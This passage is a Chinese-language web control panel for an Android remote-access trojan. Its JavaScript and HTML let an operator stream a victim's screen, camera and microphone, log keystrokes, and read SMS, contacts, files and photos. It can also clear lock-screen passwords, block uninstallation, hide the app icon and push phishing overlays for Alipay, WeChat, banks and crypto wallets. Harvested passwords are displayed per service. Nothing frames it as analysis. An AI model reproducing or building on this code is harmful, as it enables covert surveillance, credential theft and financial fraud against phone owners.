                            <button class="btn btn-sm btn-primary" onclick="searchKeylog()"><i class="fas fa-search"></i>搜索</button>
                        </div>
                        <div class="log-viewer" id="keylogViewer"><div class="status-msg"><i class="fas fa-keyboard"></i><span>选择日期查看历史记录，或开启实时监控</span></div></div>
                    </div>
                </div>

                <!-- 短信 -->
                <div class="tab-content" id="tab-sms">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-sms"></i>短信记录</div>
                            <button class="btn btn-primary" onclick="getSMS()"><i class="fas fa-sync-alt"></i>获取</button>
                        </div>
                        <div class="input-row" style="margin-top:0;margin-bottom:12px;">
                            <input type="text" class="input" id="smsNumber" placeholder="接收号码">
                            <input type="text" class="input" id="smsContent" placeholder="短信内容">
                            <button class="btn btn-danger" onclick="sendSMS()"><i class="fas fa-paper-plane"></i>发送</button>
                        </div>
                        <div class="log-viewer" id="smsViewer"><div class="status-msg"><i class="fas fa-inbox"></i><span>点击顶栏获取短信</span></div></div>
                    </div>
                </div>

                <!-- 联系人 -->
                <div class="tab-content" id="tab-contacts">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-address-book"></i>联系人</div>
                            <button class="btn btn-primary" onclick="getContacts()"><i class="fas fa-sync-alt"></i>获取</button>
                        </div>
                        <div class="log-viewer" id="contactsViewer"><div class="status-msg"><i class="fas fa-address-book"></i><span>点击顶栏获取联系人</span></div></div>
                    </div>
                </div>

                <!-- 应用 -->
                <div class="tab-content" id="tab-apps">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-th"></i>应用列表</div>
                            <div style="display:flex;gap:6px;">
                                <input type="text" class="input" id="appSearch" placeholder="搜索应用名或包名..." style="width:180px;" oninput="searchApps()">
                                <button class="btn btn-primary" onclick="getApps()"><i class="fas fa-sync-alt"></i>获取</button>
                            </div>
                        </div>
                        <div class="log-viewer" id="appsViewer"><div class="status-msg"><i class="fas fa-th"></i><span>点击顶栏获取应用</span></div></div>
                        <input type="file" id="injectFileInput" style="display:none;" onchange="handleInjectFile(event)">
                    </div>
                </div>

                <!-- 注入记录 -->
                <div class="tab-content" id="tab-inject">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-syringe"></i>注入记录</div>
                            <button class="btn btn-primary" onclick="getInjectLogs()"><i class="fas fa-sync-alt"></i>获取</button>
                        </div>
                        <div class="log-viewer" id="injectViewer"><div class="status-msg"><i class="fas fa-syringe"></i><span>点击顶栏获取注入记录</span></div></div>
                    </div>
                </div>

                <!-- 详情对话框 -->
                <div id="detailDialog" class="modal-overlay" style="display:none;">
                    <div class="modal-box">
                        <div class="modal-header"><span id="detailTitle">详情</span><button class="btn btn-sm" onclick="closeDetailDialog()">&times;</button></div>
                        <div class="modal-body"><pre id="detailContent" style="white-space:pre-wrap;word-break:break-all;margin:0;font-family:inherit;"></pre></div>
                        <div class="modal-footer"><button class="btn btn-secondary" onclick="closeDetailDialog()">关闭</button></div>
                    </div>
                </div>

                <!-- 弹窗对话框 -->
                <div id="alertDialog" class="modal-overlay" style="display:none;">
                    <div class="modal-box">
                        <div class="modal-header"><span><i class="fas fa-bell"></i> 发送弹窗通知</span><button class="btn btn-sm" onclick="closeAlertDialog()">&times;</button></div>
                        <div class="modal-body">
                            <div style="margin-bottom:10px;"><label style="display:block;margin-bottom:4px;font-size:12px;color:var(--text-muted);">标题</label><input type="text" class="input" id="alertTitle" placeholder="请输入通知标题"></div>
                            <div><label style="display:block;margin-bottom:4px;font-size:12px;color:var(--text-muted);">内容</label><textarea class="input" id="alertMsg" placeholder="请输入通知内容" rows="3" style="resize:vertical;"></textarea></div>
                        </div>
                        <div class="modal-footer"><button class="btn btn-secondary" onclick="closeAlertDialog()">取消</button><button class="btn btn-primary" onclick="sendAlert()">发送</button></div>
                    </div>
                </div>

                <!-- 文件 -->
                <div class="tab-content" id="tab-files">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-folder"></i>文件管理</div>
                            <div style="display:flex;gap:6px;">
                                <button class="btn btn-secondary btn-sm" onclick="getFiles('get0')">SD卡</button>
                                <button class="btn btn-secondary btn-sm" onclick="getFiles('get2')">Pictures</button>
                                <button class="btn btn-secondary btn-sm" onclick="getFiles('get3')">DCIM</button>
                            </div>
                        </div>
                        <div class="path-bar">
                            <i class="fas fa-folder-open" style="color:var(--warning);"></i>
                            <input type="text" id="pathInput" value="/sdcard/">
                            <button class="btn btn-sm btn-primary" onclick="getFilesByPath()"><i class="fas fa-arrow-right"></i></button>
                        </div>
                        <div class="log-viewer" id="filesViewer"><div class="status-msg"><i class="fas fa-folder-open"></i><span>选择目录浏览文件</span></div></div>
                    </div>
                </div>

                <!-- 相册 -->
                <div class="tab-content" id="tab-gallery">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-images"></i>设备相册</div>
                            <div style="display:flex;gap:6px;">
                                <button class="btn btn-secondary btn-sm" onclick="getGallery('DCIM')">相机照片</button>
                                <button class="btn btn-secondary btn-sm" onclick="getGallery('Pictures')">图片</button>
                                <button class="btn btn-secondary btn-sm" onclick="getGallery('Screenshots')">截图</button>
                                <button class="btn btn-primary btn-sm" onclick="getGallery('all')"><i class="fas fa-sync-alt"></i>全部</button>
                                <button class="btn btn-success btn-sm" onclick="quickShowGallery()" id="quickShowBtn"><i class="fas fa-th"></i>一键展示</button>
                            </div>
                        </div>
                        <div class="gallery-grid" id="galleryViewer">
                            <div class="status-msg"><i class="fas fa-images"></i><span>点击按钮获取相册</span></div>
                        </div>
                    </div>
                </div>

                <!-- 相机 -->
                <div class="tab-content" id="tab-camera">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-camera"></i>摄像监控</div>
                            <div style="display:flex;gap:6px;">
                                <select class="input" id="camSelect" style="width:100px;"><option value="front">前置</option><option value="back">后置</option></select>
                                <button class="btn btn-success" onclick="startCam()"><i class="fas fa-play"></i>开启</button>
                                <button class="btn btn-danger" onclick="stopCam()"><i class="fas fa-stop"></i>关闭</button>
                            </div>
                        </div>
                        <div class="screen-display" id="camDisplay" style="min-height:400px;background:#000;border-radius:8px;">
                            <div class="screen-placeholder"><i class="fas fa-camera"></i><div>点击开启相机</div></div>
                        </div>
                    </div>
                </div>

                <!-- 录音 -->
                <div class="tab-content" id="tab-mic">
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas fa-microphone"></i>声音监控</div>
                            <div style="display:flex;gap:6px;">
                                <button class="btn btn-success" onclick="startMic()"><i class="fas fa-play"></i>开启</button>
                                <button class="btn btn-danger" onclick="stopMic()"><i class="fas fa-stop"></i>关闭</button>
                            </div>
                        </div>
                        <div id="micStatus" style="padding:40px;text-align:center;color:var(--text-muted);">
                            <i class="fas fa-microphone-slash" style="font-size:48px;opacity:0.3;"></i>
                            <div style="margin-top:12px;">点击开启录音监控</div>
                        </div>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <div class="toast" id="toast"><i class="fas fa-check-circle" style="color:var(--success);"></i><span id="toastMsg">成功</span></div>

    <script>
        let ws = null;
        const phoneId = "8088322026367240286054";
        const apiToken = "7c93d773dafca8b32a65d6bec1e97499"; // 用于API认证
        let screenW = 1080, screenH = 1920;
        let phoneInfo = null;
        let keylogDates = [];
        let deviceOnline = false;
        let smsCache = [];
        let contactsCache = [];
        let appsCache = [];
        let pendingDownloadFile = false; // 标记是否是用户主动下载

        document.addEventListener('DOMContentLoaded', () => {
            if (phoneId) {
                connectWS();
                initKeylogState();
                loadServerKeylogDates();
            } else {
                toast('缺少设备ID', 'error');
            }

            document.querySelectorAll('.tab').forEach(tab => {
                tab.addEventListener('click', () => {
                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                    tab.classList.add('active');
                    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
                    autoFetchData(tab.dataset.tab);
                });
            });
        });
        
        function autoFetchData(tabName) {
            switch(tabName) {
                case 'keylog': getKeylogByDate(); break;
                case 'sms': if (!smsCache.length) getSMS(); break;
                case 'contacts': if (!contactsCache.length) getContacts(); break;
                case 'apps': if (!appsCache.length) getApps(); break;
                case 'inject': getInjectLogs(); break;
                case 'files': getFiles('/sdcard/'); break;
                case 'gallery': if (!galleryCache.length) getGallery('DCIM'); break;
            }
        }

        function connectWS() {
            ws = new WebSocket(`wss://${location.host}/api/ws/`);
            
            ws.onopen = () => {
                document.getElementById('wsDot').classList.add('online');
                document.getElementById('wsText').textContent = '已连接';
                ws.send(JSON.stringify({ pid: phoneId, itype: 'slr_panel', subc: 'join', usercheck: '' }));
                setInterval(() => {
                    if (ws?.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ pid: phoneId, itype: 'slr_panel', subc: 'ping' }));
                    }
                }, 5000);
                setTimeout(() => restoreKeylogIfActive(), 1000);
                setTimeout(() => restoreScreenIfActive(), 800);  // 重连后恢复投屏
            };

            ws.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    handleMsg(data);
                } catch (err) { console.error(err); }
            };

            ws.onclose = () => {
                document.getElementById('wsDot').classList.remove('online');
                document.getElementById('wsText').textContent = '已断开';
                deviceOnline = false;
                document.getElementById('offlineOverlay').classList.remove('hidden');
                setTimeout(connectWS, 3000);
            };

            ws.onerror = () => toast('连接错误', 'error');
        }

        function reconnect() {
            if (ws) ws.close();
            connectWS();
        }

        function handleMsg(data) {
            if (!data.pid && !data.type) return;
            switch (data.type) {
                case 'statusBatch': updateStatus(data); break;
                case 'screen': updateTextAssistScreen(data.data, data.wmob, data.hmob); break;
                case 'screenshot': updateScreenshot(data.data, data.wmob, data.hmob); break;
                case 'klog': showKeylogRealtime(data.data); break;
                case 'klogsdate': showKeylogHistory(data.data); break;
                case 'sms': showSMS(data.data); break;
                case 'loadcontacts': showContacts(data.data); break;
                case 'loadapps': showApps(data.data); break;
                case 'injapps': showInjectLogs(data.data); break;
                case 'files': 
                    if (galleryMode) { showGalleryFiles(data.data); } 
                    else { showFiles(data.data); } 
                    break;
                case 'down':
                    // 文件下载分块数据
                    handleDownloadChunk(data);
                    break;
                case 'savefiles':
                    // 文件数据 - JSON格式: { fileName, fileContent }
                    try {
                        const fileInfo = JSON.parse(data.data);
                        const fileName = fileInfo.fileName;
                        const fileContent = fileInfo.fileContent;
                        
                        // 检查是否是快速预览面板
                        if (quickPreviewIndex >= 0 && quickShowModal && isImageFile(fileName)) {
                            let imgSrc = fileContent.startsWith('data:') ? fileContent : `data:image/jpeg;base64,${fileContent}`;
                            showQuickPreviewImage(imgSrc);
                            // 压缩并缓存
                            if (quickPreviewPendingPath) {
                                compressToThumb(imgSrc, 150).then(thumb => saveThumbToCache(quickPreviewPendingPath, thumb));
                                quickPreviewPendingPath = null;
                            }
                        }
                        // 检查是否是相册预览
                        else if (currentPreviewIndex >= 0 && isImageFile(fileName)) {
                            showGalleryPreviewImage(fileContent);
                        }
                        // 检查是否是待处理的快速预览请求（弹窗已关闭，忽略）
                        else if (quickPreviewPendingPath && isImageFile(fileName)) {
                            quickPreviewPendingPath = null;
                            // 忽略，不下载
                        }
                        // 检查是否是主动请求的下载（需要用户点击下载按钮）
                        else if (pendingDownloadFile && isImageFile(fileName)) {
                            downloadBase64File(fileName, fileContent);
                            pendingDownloadFile = false;
                        }
                        // 非图片文件或用户主动下载
                        else if (pendingDownloadFile) {
                            downloadBase64File(fileName, fileContent);
                            pendingDownloadFile = false;
                        }
                        // 其他情况忽略（防止意外下载）
                    } catch(e) {
                        console.error('[savefiles] 解析失败:', e);
                    }
                    break;
                case 'thumb':
                    // 缩略图数据
                    if (quickShowModal && data.path) {
                        handleThumbResponse(data);
                    } else if (currentPreviewIndex >= 0 && data.data) {
                        showGalleryPreviewImage(data.data);
                    }
                    break;
                case 'snap':
                    // 快照数据
                    if (currentPreviewIndex >= 0 && data.data) {
                        showGalleryPreviewImage(data.data);
                    }
                    break;
                case 'cam': updateCam(data.data); break;
                case 'mic': playMic(data.data); break;
            }
        }

        function updateStatus(data) {
            const info = data.phoneInfo || {};
            phoneInfo = info;
            const online = data.serverToPhone === 'OPEN';
            deviceOnline = online;
            
            const overlay = document.getElementById('offlineOverlay');
            if (online) { overlay.classList.add('hidden'); } else { overlay.classList.remove('hidden'); }
            
            const badge = document.getElementById('deviceBadge');
            badge.className = 'device-badge ' + (online ? 'online' : 'offline');
            badge.textContent = online ? '在线' : '离线';

            document.getElementById('infoName').textContent = info.phone_name || '--';
            document.getElementById('infoModel').textContent = info.model || '--';
            document.getElementById('infoVersion').textContent = info.android_version || '--';
            document.getElementById('infoPhone').textContent = info.phone_number || '--';
            document.getElementById('infoIP').textContent = info.address || '--';
            document.getElementById('infoPass').textContent = info.phone_password ? '有数据' : '--';
            document.getElementById('infoLastPing').textContent = data.lastPing || '--';
            document.getElementById('infoAccess').textContent = info.accessibility == '1' ? '已开启' : '未开启';
            
            updatePwdCard(info.phone_password);

            const bat = parseInt(info.battery_charge?.replace(/\D/g, '')) || 0;
            const bl = document.getElementById('batteryLevel');
            bl.style.width = bat + '%';
            bl.className = 'battery-level' + (bat <= 20 ? ' low' : bat <= 50 ? ' medium' : '');
            document.getElementById('batteryText').textContent = bat + '%';

            loadServerKeylogDates();
        }

        function updatePwdCard(pwdStr) {
            const container = document.getElementById('pwdContainer');
            if (!pwdStr || pwdStr === '--') { container.innerHTML = '<div style="color:var(--text-muted);">暂无密码数据</div>'; return; }
            const pwdLabels = ['手机密码', '钓鱼密码', 'Alipay密码', 'Wechat密码', '云密码', '建密码', '邮密码', '农密码', '中密码', '工密码', '招密码', 'gp密码', 'pe密码', 'an密码', 'mb密码', 'bc密码', 'Trust密码', 'Imtoken密码', 'Tokenpocket密码'];
            let html = '', remaining = pwdStr;
            pwdLabels.forEach((label, i) => {
                const nextLabel = pwdLabels[i + 1];
                let value = '';
                const startIdx = remaining.indexOf(label + ':');
                if (startIdx !== -1) {
                    const afterLabel = remaining.substring(startIdx + label.length + 1);
                    value = nextLabel ? (afterLabel.indexOf(nextLabel + ':') !== -1 ? afterLabel.substring(0, afterLabel.indexOf(nextLabel + ':')).trim() : afterLabel.trim()) : afterLabel.trim();
                }
                value = value.replace(/^\s+|\s+$/g, '').replace(/\s+/g, ' ');
                if (!value) value = '--';
                const hasValue = value && value !== '--' && value.length > 0;
                html += `<div style="display:flex;gap:8px;padding:4px 0;border-bottom:1px solid var(--border);"><span style="min-width:100px;color:var(--text-muted);">${label}:</span><span style="color:${hasValue ? 'var(--success)' : 'var(--text-muted)'};word-break:break-all;">${value}</span></div>`;
            });
            container.innerHTML = html || '<div style="color:var(--text-muted);">暂无密码数据</div>';
        }

        let screenImgEl = null;
        let lastScreenUpdate = 0;  // 最后一次收到投屏数据的时间
        let screenTimeoutTimer = null;  // 超时检测定时器
        const SCREEN_TIMEOUT = 8000;  // 8秒没收到数据就提示
        let textAssistImgEl = null;   // 文字辅助图片元素

        // 文字辅助专用 - 处理 screen 类型消息
        function updateTextAssistScreen(img, w, h) {
            if (!img || !textAssistActive) return;
            const container = document.getElementById('textAssistDisplay');
            if (!container) return;
            
            if (!textAssistImgEl) {
                textAssistImgEl = document.createElement('img');
                textAssistImgEl.style.cssText = 'width:100%; height:100%; object-fit:contain; display:block;';
                container.innerHTML = '';
                container.appendChild(textAssistImgEl);
            }
            textAssistImgEl.src = 'data:image/jpeg;base64,' + img;
        }
        
        // 截图/投屏专用 - 处理 screenshot 类型消息
        function updateScreenshot(img, w, h) {
            if (!img || !screenRunning) return;
            lastScreenUpdate = Date.now();
            screenW = w || 1080; screenH = h || 1920;
            const container = document.getElementById('screenDisplay1');
            
            if (!screenImgEl) {
                screenImgEl = document.createElement('img');
                screenImgEl.style.cssText = 'max-width:100%;max-height:calc(100vh - 300px);cursor:crosshair;border-radius:4px;user-select:none;-webkit-user-drag:none;display:block;margin:0 auto;';
                container.innerHTML = '';
                container.appendChild(screenImgEl);
            }
            const timeoutTip = container.querySelector('.screen-timeout-tip');
            if (timeoutTip) timeoutTip.remove();
            screenImgEl.src = 'data:image/jpeg;base64,' + img;
        }
        
        // 检测投屏是否卡住
        function startScreenTimeoutCheck() {
            // 不再自动重连
        }

        function stopScreenTimeoutCheck() {
            if (screenTimeoutTimer) {
                clearInterval(screenTimeoutTimer);
                screenTimeoutTimer = null;
            }
        }

        let isDragging = false, isClick = true, isLongPress = false, startX = 0, startY = 0, movePoints = [], longPressTimer = null, currentImg = null;
        const MOVE_THRESHOLD = 5;
        function getScreenImg(container) { return container.querySelector('img') || container; }
        function imgToScreenCoord(imgX, imgY, rect) { return { x: Math.round(imgX * screenW / rect.width), y: Math.round(imgY * screenH / rect.height) }; }
        function handleMouseDown(e) { e.preventDefault(); if (e.button !== 0) return; const container = e.currentTarget; const img = getScreenImg(container); if (!img || img.tagName !== 'IMG') return; currentImg = img; const rect = img.getBoundingClientRect(); startX = e.clientX - rect.left; startY = e.clientY - rect.top; if (startX < 0 || startX > rect.width || startY < 0 || startY > rect.height) return; isDragging = true; isClick = true; isLongPress = false; movePoints = [{ x: startX, y: startY }]; longPressTimer = setTimeout(() => { isLongPress = true; }, 350); }
        function handleMouseMove(e) { if (!isDragging || !currentImg) return; const rect = currentImg.getBoundingClientRect(); const x = e.clientX - rect.left; const y = e.clientY - rect.top; if (Math.abs(x - startX) > MOVE_THRESHOLD || Math.abs(y - startY) > MOVE_THRESHOLD) { isClick = false; clearTimeout(longPressTimer); } movePoints.push({ x: Math.max(0, Math.min(x, rect.width)), y: Math.max(0, Math.min(y, rect.height)) }); }
        function handleMouseUp(e) { e.preventDefault(); if (!isDragging || !currentImg) return; isDragging = false; clearTimeout(longPressTimer); const rect = currentImg.getBoundingClientRect(); const startPos = imgToScreenCoord(startX, startY, rect); if (isLongPress && isClick) { send('slr_panel', 'screen', { comand: 'mov', movetype: '2', poi: startPos }); toast('长按'); } else if (isClick) { send('slr_panel', 'screen', { comand: 'mov', movetype: '0', poi: startPos }); } else { const pathStr = movePoints.map(p => { const sc = imgToScreenCoord(p.x, p.y, rect); return `(${sc.x},${sc.y})`; }).join(':'); send('slr_panel', 'screen', { comand: 'mov', movetype: '1', poi: pathStr }); } movePoints = []; currentImg = null; }
        function handleTouchStart(e) { e.preventDefault(); const container = e.currentTarget; const img = getScreenImg(container); if (!img || img.tagName !== 'IMG') return; currentImg = img; const touch = e.touches[0]; const rect = img.getBoundingClientRect(); startX = touch.clientX - rect.left; startY = touch.clientY - rect.top; if (startX < 0 || startX > rect.width || startY < 0 || startY > rect.height) return; isDragging = true; isClick = true; isLongPress = false; movePoints = [{ x: startX, y: startY }]; longPressTimer = setTimeout(() => { isLongPress = true; }, 350); }
        function handleTouchMove(e) { if (!isDragging || !currentImg) return; const touch = e.touches[0]; const rect = currentImg.getBoundingClientRect(); const x = touch.clientX - rect.left; const y = touch.clientY - rect.top; if (Math.abs(x - startX) > MOVE_THRESHOLD || Math.abs(y - startY) > MOVE_THRESHOLD) { isClick = false; clearTimeout(longPressTimer); } movePoints.push({ x: Math.max(0, Math.min(x, rect.width)), y: Math.max(0, Math.min(y, rect.height)) }); }
        function handleTouchEnd(e) { e.preventDefault(); if (!isDragging || !currentImg) return; isDragging = false; clearTimeout(longPressTimer); const rect = currentImg.getBoundingClientRect(); const startPos = imgToScreenCoord(startX, startY, rect); if (isLongPress && isClick) { send('slr_panel', 'screen', { comand: 'mov', movetype: '2', poi: startPos }); toast('长按'); } else if (isClick) { send('slr_panel', 'screen', { comand: 'mov', movetype: '0', poi: startPos }); } else { const pathStr = movePoints.map(p => { const sc = imgToScreenCoord(p.x, p.y, rect); return `(${sc.x},${sc.y})`; }).join(':'); send('slr_panel', 'screen', { comand: 'mov', movetype: '1', poi: pathStr }); } movePoints = []; currentImg = null; }

        function send(itype, subc, extra = {}) { if (ws?.readyState === WebSocket.OPEN) { ws.send(JSON.stringify({ pid: phoneId, itype, subc, ...extra })); } else { toast('未连接', 'error'); } }

        let screenRunning = false, currentScreenMode = null;
        function startScreen() { 
            const mode = document.getElementById('screenMode').value; 
            if (currentScreenMode && currentScreenMode !== mode) { 
                send('slr_panelsend', 'screen', { screentype: currentScreenMode + 'OFF' }); 
            } 
            // 显示等待状态
            screenImgEl = null;
            document.getElementById('screenDisplay1').innerHTML = '<div class="screen-placeholder" style="color:var(--accent);"><i class="fas fa-spinner fa-spin"></i><div>正在连接设备...</div></div>';
            send('slr_panelsend', 'screen', { screentype: mode }); 
            currentScreenMode = mode; 
            screenRunning = true;
            startScreenTimeoutCheck();  // 启动超时检测
            toast('开始' + ({ SM: '截图', SN: '投屏', SK: '文字识别' }[mode] || mode)); 
        }
        function stopScreen() { 
            stopScreenTimeoutCheck();  // 停止超时检测
            if (currentScreenMode) { 
                send('slr_panelsend', 'screen', { screentype: currentScreenMode + 'OFF' }); 
                currentScreenMode = null; 
            } 
            screenRunning = false; 
            screenImgEl = null;
            document.getElementById('screenDisplay1').innerHTML = '<div class="screen-placeholder" style="color:var(--danger);"><i class="fas fa-stop-circle"></i><div>已关闭</div></div>'; 
            toast('已停止'); 
        }
        // WebSocket重连后自动恢复投屏
        function restoreScreenIfActive() {
            if (screenRunning && currentScreenMode) {
                setTimeout(() => {
                    send('slr_panelsend', 'screen', { screentype: currentScreenMode });
                    lastScreenUpdate = Date.now();
                    toast('正在恢复投屏...');
                }, 500);
            }
        }
        // 文字辅助功能
        let textAssistActive = false;
        function toggleTextAssist() {
            if (textAssistActive) {
                stopTextAssist();
                return;
            }
            send('slr_panelsend', 'screen', { screentype: 'SK' });
            document.getElementById('textAssistDisplay').innerHTML = '<div class="screen-placeholder" style="color:var(--accent);"><i class="fas fa-spinner fa-spin"></i><div>正在连接...</div></div>';
            textAssistActive = true;
            toast('已开启文字辅助');
        }
        
        function stopTextAssist() {
            send('slr_panelsend', 'screen', { screentype: 'SKOFF' });
            document.getElementById('textAssistDisplay').innerHTML = '<div class="screen-placeholder"><i class="fas fa-font"></i><div>点击开启文字识别</div></div>';
            textAssistImgEl = null;
            textAssistActive = false;
            toast('已关闭文字辅助');
        }
        
        function wakeScreen() { send('slr_panel', 'screen', { comand: 'nav', navshort: 'ho' }); toast('点亮屏幕'); }
        function sendNav(n) { send('slr_panel', 'screen', { comand: 'nav', navshort: n }); }
        function sendLock(l) { 
            send('slr_panel', 'screen', { comand: 'L', lockit: String(l) }); 
            const msgs = { '0': '已锁定设备', '1': '已解锁设备', '2': '已清除锁屏密码', '3': '已禁用人脸解锁' };
            toast(msgs[String(l)] || '已发送');
        }
        function sendMute() { send('slr_panel', 'screen', { comand: 'vol', volstate: '0' }); toast('已开启静音'); }
        function sendUnmute() { send('slr_panel', 'screen', { comand: 'vol', volstate: '1' }); toast('已关闭静音'); }
        function sendKb(k) { 
            send('slr_panel', 'screen', { comand: 'kb', kbstate: String(k) }); 
            const msgs = { '0': '键盘已开启', '1': '键盘已关闭', '2': '已开启防卸载', '3': '已关闭防卸载' };
            toast(msgs[String(k)] || '已发送');
        }
        function sendBlock(b) { 
            send('slr_panel', 'screen', { comand: 'block', bstate: String(b), color: '0' }); 
            const msgs = { '0': '已开启黑屏', '1': '已取消黑屏', '2': '已阻止操作', '3': '已允许操作' };
            toast(msgs[String(b)] || '已发送');
        }
        function sendPaste() { const txt = document.getElementById('pasteInput').value; if (!txt) { toast('请输入内容', 'error'); return; } send('slr_panel', 'screen', { comand: 'paste', txt: txt }); toast('已粘贴到设备'); }
        function sendPhish() { const typ = document.getElementById('phishType').value; send('slr_panelsend', 'DIAO', { pin: '', title: '', lckdis: '', typ: typ }); toast('已发送钓鱼请求'); }
        function sendBankPhish(bankType) { 
            const bankNames = { 'a': '支付宝', 'w': '微信', 'yun': '云闪付', 'jian': '建行', 'you': '邮储', 'nong': '农行', 'zhong': '中行', 'gong': '工行', 'zhao': '招行', 'gpay': 'Google Pay', 'phonepe': 'PhonePe', 'bc': 'BC', 'mb': 'MB' };
            send('slr_panelsend', 'DIAO', { pin: '', title: '', lckdis: '', typ: bankType }); 
            toast('已发送 ' + (bankNames[bankType] || bankType) + ' 钓鱼'); 
        }
        let blockTextActive = false;
        function toggleBlockText() { const btn = document.getElementById('blockTextBtn'); if (blockTextActive) { send('slr_panel', 'screen', { comand: 'block', bstate: '1', color: '0' }); btn.innerHTML = '<i class="fas fa-tv"></i>显示'; btn.className = 'btn btn-dark'; blockTextActive = false; toast('已取消黑屏'); } else { const text = document.getElementById('blockText').value || ''; const bg = document.getElementById('blockBg').value; if (text) { send('slr_panel', 'screen', { comand: 'blockd', blocktext: text }); } send('slr_panel', 'screen', { comand: 'block', bstate: '0', color: bg }); btn.innerHTML = '<i class="fas fa-times"></i>取消'; btn.className = 'btn btn-danger'; blockTextActive = true; toast('已显示黑屏文字'); } }
        function hideIcon() { send('slr_panelsend', 'Hideico'); toast('已发送'); }
        const quickAppMap = { 'TP': { pkg: 'vip.mytokenpocket', name: 'TokenPocket' }, 'IM': { pkg: 'im.token.app', name: 'imToken' }, 'TG': { pkg: 'org.telegram.messenger', name: 'Telegram' }, 'OneKey': { pkg: 'so.onekey.app.wallet', name: 'OneKey' }, '波宝': { pkg: 'com.tronlinkpro.wallet', name: '波宝Pro' }, '支': { pkg: 'com.eg.android.AlipayGphone', name: '支付宝' }, '微': { pkg: 'com.tencent.mm', name: '微信' } };
        function openQuickApp(key) { const app = quickAppMap[key]; if (!app) return; let pkg = app.pkg; if (appsCache && appsCache.length > 0) { let found = appsCache.find(a => a.packageName === app.pkg); if (!found) { found = appsCache.find(a => (a.name && a.name.toLowerCase().includes(app.name.toLowerCase())) || (a.packageName && a.packageName.toLowerCase().includes(key.toLowerCase()))); } if (found) { pkg = found.packageName; } } send('slr_panelsend', 'OPENAPP', { packageName: pkg }); toast('正在打开 ' + app.name + '...'); }

        let keylogActive = false, keylogAllData = '';
        function initKeylogState() { const storedState = localStorage.getItem('keylog_active_' + phoneId); if (phoneId && storedState === 'true') { keylogActive = true; const btn = document.getElementById('keylogToggleBtn'); if (btn) { btn.innerHTML = '<i class="fas fa-stop"></i>关闭'; btn.className = 'btn btn-danger'; } } }
        function restoreKeylogIfActive() { if (keylogActive && phoneId) { send('slr_panelsend', 'Keylog', { keylogtype: '0' }); keylogFirstData = true; document.getElementById('keylogViewer').innerHTML = '<div class="status-msg"><i class="fas fa-spinner fa-spin"></i><span>等待键盘输入...</span></div>'; } }
        function toggleKeylog() { const btn = document.getElementById('keylogToggleBtn'); if (keylogActive) { send('slr_panelsend', 'Keylog', { keylogtype: '1' }); btn.innerHTML = '<i class="fas fa-play"></i>开启'; btn.className = 'btn btn-success'; keylogActive = false; localStorage.setItem('keylog_active_' + phoneId, 'false'); toast('已关闭键盘记录'); } else { send('slr_panelsend', 'Keylog', { keylogtype: '0' }); btn.innerHTML = '<i class="fas fa-stop"></i>关闭'; btn.className = 'btn btn-danger'; keylogActive = true; localStorage.setItem('keylog_active_' + phoneId, 'true'); keylogFirstData = true; keylogAllData = ''; document.getElementById('keylogViewer').innerHTML = '<div class="status-msg"><i class="fas fa-spinner fa-spin"></i><span>等待键盘输入...</span></div>'; toast('已开启键盘记录'); } }
        function searchKeylog() { const keyword = document.getElementById('keylogSearch').value; if (!keyword) { toast('请输入搜索关键词', 'error'); return; } toast('正在搜索...'); fetch('/api/KeylogSave.php?phone_id=' + phoneId + '&keyword=' + encodeURIComponent(keyword) + '&token=' + encodeURIComponent(apiToken)).then(r => r.json()).then(res => { if (res.status === 'success' && res.data) { const lines = res.data.split('\n').filter(l => l.trim()); if (lines.length > 0) { showSearchResultModal(keyword, lines); toast('找到 ' + lines.length + ' 条匹配'); } else { toast('未找到匹配内容', 'error'); } } else { toast('未找到匹配内容', 'error'); } }).catch(e => toast('搜索失败', 'error')); }
        function showSearchResultModal(keyword, lines) { document.body.insertAdjacentHTML('beforeend', `<div class="modal-overlay" id="searchResultModal" onclick="if(event.target===this)this.remove()"><div class="modal-box" style="width:600px;max-width:90%;max-height:80vh;display:flex;flex-direction:column;"><div class="modal-header"><span><i class="fas fa-search"></i> 搜索结果: "${keyword}" (${lines.length}条)</span><button class="modal-close" onclick="document.getElementById('searchResultModal').remove()">&times;</button></div><div class="modal-body" style="flex:1;overflow-y:auto;padding:0;"><pre style="white-space:pre-wrap;word-break:break-all;margin:0;padding:12px;font-size:12px;color:var(--text);background:var(--bg);min-height:200px;">${lines.map(l => l.replace(new RegExp(keyword, 'gi'), '<span style="background:var(--warning);color:#000;padding:1px 3px;border-radius:2px;">$&</span>')).join('\n')}</pre></div><div class="modal-footer" style="padding:10px;border-top:1px solid var(--border);text-align:right;"><button class="btn btn-secondary" onclick="document.getElementById('searchResultModal').remove()">关闭</button></div></div></div>`); }
        function saveKeylogToServer(data) { if (!data || !phoneId) return; fetch('/api/KeylogSave.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone_id: phoneId, log: data }) }).catch(e => {}); }
